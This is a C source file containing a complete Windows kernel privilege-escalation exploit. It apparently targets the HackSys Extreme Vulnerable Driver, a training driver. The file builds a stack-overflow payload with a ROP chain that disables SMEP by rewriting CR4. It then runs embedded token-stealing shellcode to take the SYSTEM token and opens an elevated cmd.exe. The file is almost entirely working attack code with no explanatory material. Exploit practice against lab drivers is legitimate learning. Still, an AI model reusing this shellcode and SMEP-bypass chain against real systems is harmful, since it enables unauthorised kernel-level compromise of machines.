#include <windows.h>
#include <stdio.h>
#include <psapi.h>

BYTE token_stealing[120] = {
    0x65, 0x48, 0x8b, 0x14, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x82,
    0xb8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc3, 0x48, 0x8b, 0x9b, 0x48, 0x04,
    0x00, 0x00, 0x48, 0x81, 0xeb, 0x48, 0x04, 0x00, 0x00, 0x48, 0x83, 0xbb,
    0x40, 0x04, 0x00, 0x00, 0x04, 0x75, 0xe8, 0x48, 0x8b, 0x8b, 0xb8, 0x04,
    0x00, 0x00, 0x80, 0xe1, 0xf0, 0x48, 0x89, 0x88, 0xb8, 0x04, 0x00, 0x00,
    0x66, 0x8b, 0x8a, 0xe4, 0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89,
    0x8a, 0xe4, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x92, 0x90, 0x00, 0x00, 0x00,
    0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68, 0x01,
    0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2,
    0x80, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07
};

int main() {
    LPVOID drivers[256];
    DWORD needed;

    EnumDeviceDrivers(drivers, 256, &needed);  
    LPVOID ntoskrnl_base = drivers[0];

    LPVOID payload = VirtualAlloc(NULL, 2104, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID shellcode = VirtualAlloc(NULL, sizeof(token_stealing), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlFillMemory(payload, 2072, 'A');
    RtlCopyMemory(shellcode, token_stealing, sizeof(token_stealing));

    ULONGLONG *rop = (ULONGLONG *) ((ULONGLONG) payload + 2072);

    *rop++ = (ULONGLONG) ntoskrnl_base + 0x2163ec; // pop rcx; ret;
    *rop++ = (ULONGLONG) 0x350ef8 ^ 1UL << 20;     // cr4 value
    *rop++ = (ULONGLONG) ntoskrnl_base + 0x3a06a7; // mov cr4, rcx; ret;
    *rop++ = (ULONGLONG) shellcode;                // token stealing

    HANDLE handle = CreateFileA("\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (handle == INVALID_HANDLE_VALUE) {
        puts("[-] Failed to get handle");
        exit(1);
    }

    DeviceIoControl(handle, 0x222003, payload, 2104, NULL, 0, NULL, NULL);

    system("cmd.exe");
    exit(0);

    return 0;
}